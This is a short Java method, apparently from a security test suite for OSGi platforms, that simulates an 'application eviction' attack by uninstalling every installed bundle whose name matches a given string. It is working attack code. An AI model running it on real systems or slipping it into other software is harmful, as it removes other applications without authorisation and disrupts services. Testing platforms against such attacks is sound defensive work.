public String testApplicationEviction(String appname) {
    System.out.println("[ATTACK] Application_Eviction");
    boolean isRemoved = false;
    String result = "";

    BundleContext bc = contextbk.getBundleContext();

    Bundle[] blist = bc.getBundles();

    for (int i = 0; i < blist.length; i++) {
        Bundle bd = blist[i];
        bd.getRegisteredServices();

        if (bd.getSymbolicName().contains(appname)) {
            isRemoved = true;
            result = bd.getSymbolicName();

            System.out.println("[ATTACK] " + result + " is uninstalled!");

            try {
                bd.uninstall();
            } catch (BundleException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
    }

    if (!isRemoved) {
        result = "fail";
    }

    return result;
}
